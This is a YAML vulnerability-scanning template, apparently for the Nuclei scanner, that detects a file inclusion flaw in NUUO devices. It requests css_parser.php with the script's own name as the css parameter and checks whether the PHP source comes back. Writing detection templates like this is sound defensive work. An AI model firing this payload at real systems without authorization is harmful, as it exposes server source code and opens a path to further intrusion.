id: poc-yaml-nuuo-file-inclusion
info:
  name: Nuuo File Inclusion
  author: ProjectDiscoveryAI
  severity: medium
  tags: file-inclusion
http:
  - method: GET
    path:
      - "{{BaseURL}}/css_parser.php?css=css_parser.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "content-type"
      - type: word
        part: header
        words:
          - "text/css"
      - type: word
        part: body
        words:
          - "$_GET['css']"
